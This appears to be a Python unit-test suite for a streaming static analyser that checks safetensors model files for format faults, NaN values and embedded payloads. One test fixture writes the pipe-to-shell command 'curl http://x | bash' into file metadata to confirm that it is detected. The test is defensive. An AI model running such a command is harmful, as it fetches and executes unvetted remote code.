#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""P3: unit-тесты потокового статического анализа (index-driven, coverage, findings)."""
from __future__ import annotations

import json
import math
import os
import struct
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(ROOT, "deploy", "v3", "analysis"))

import static_stream  # noqa: E402


def make_safetensors(header: dict, tensors: list[tuple[str, str, bytes]]) -> bytes:
    data = b""
    offs = {}
    for name, _dtype, raw in tensors:
        offs[name] = (len(data), len(data) + len(raw))
        data += raw
    h = dict(header)
    for name, dtype, _raw in tensors:
        h[name] = {"dtype": dtype, "shape": [len(_raw) // {"F32": 4, "F64": 8, "F16": 2}[dtype]],
                   "data_offsets": list(offs[name])}
    hj = json.dumps(h).encode()
    return struct.pack("<Q", len(hj)) + hj + data


def reader_of(blob: bytes):
    calls = {"n": 0, "bytes": 0}

    def rd(off, length):
        calls["n"] += 1
        chunk = blob[off:off + length]
        calls["bytes"] += len(chunk)
        return chunk
    return rd, calls


class StaticStreamTest(unittest.TestCase):
    def test_clean_full_index_coverage(self):
        raw = struct.pack("<" + "f" * 262144, *([0.0] * 262144))   # 1 МиБ нулей
        blob = make_safetensors({}, [("w", "F32", raw)])
        rd, calls = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertEqual(r["format"], "safetensors")
        self.assertTrue(r["coverage"]["index"])
        self.assertEqual(r["coverage"]["index_ratio"], 1.0)
        self.assertEqual(r["coverage"]["tensors_total"], 1)
        self.assertEqual(r["findings"], [])
        self.assertLess(calls["bytes"], len(blob))       # не читаем весь объект целиком

    def test_nan_detected_in_sample(self):
        vals = [0.0] * 50 + [float("nan")] + [0.0] * 49
        raw = struct.pack("<" + "f" * 100, *vals)
        blob = make_safetensors({}, [("w", "F32", raw)])
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertTrue(any(f["check_id"] == "BD-01" for f in r["findings"]))

    def test_payload_in_metadata(self):
        raw = struct.pack("<f", 0.0)
        blob = make_safetensors({"__metadata__": {"note": "curl http://x | bash"}}, [("w", "F32", raw)])
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertTrue(any(f["check_id"] == "EXEC-02" for f in r["findings"]))

    def test_tensor_out_of_bounds(self):
        hj = json.dumps({"w": {"dtype": "F32", "shape": [1000], "data_offsets": [0, 4000]}}).encode()
        blob = struct.pack("<Q", len(hj)) + hj + b"\x00" * 16   # заявлено 4000, данных 16
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertTrue(any(f["check_id"] == "FMT-02" for f in r["findings"]))

    def test_trailing_data(self):
        raw = struct.pack("<f", 1.0)
        blob = make_safetensors({}, [("w", "F32", raw)]) + b"\x00" * 32
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertTrue(any(f["check_id"] == "FMT-11" for f in r["findings"]))

    def test_bad_header_len(self):
        blob = struct.pack("<Q", 10 ** 9) + b"{}"
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertTrue(any(f["check_id"] == "FMT-01" for f in r["findings"]))
        self.assertFalse(r["coverage"]["index"])

    def test_coverage_ratio_sampled(self):
        raws = [("t%d" % i, "F32", struct.pack("<f", float(i))) for i in range(4)]
        blob = make_safetensors({}, raws)
        rd, _ = reader_of(blob)
        r = static_stream.analyze_safetensors(rd, len(blob))
        self.assertEqual(r["coverage"]["tensors_total"], 4)
        self.assertEqual(r["coverage"]["tensors_sampled"], 4)
        self.assertEqual(r["coverage"]["data_ratio"], 1.0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
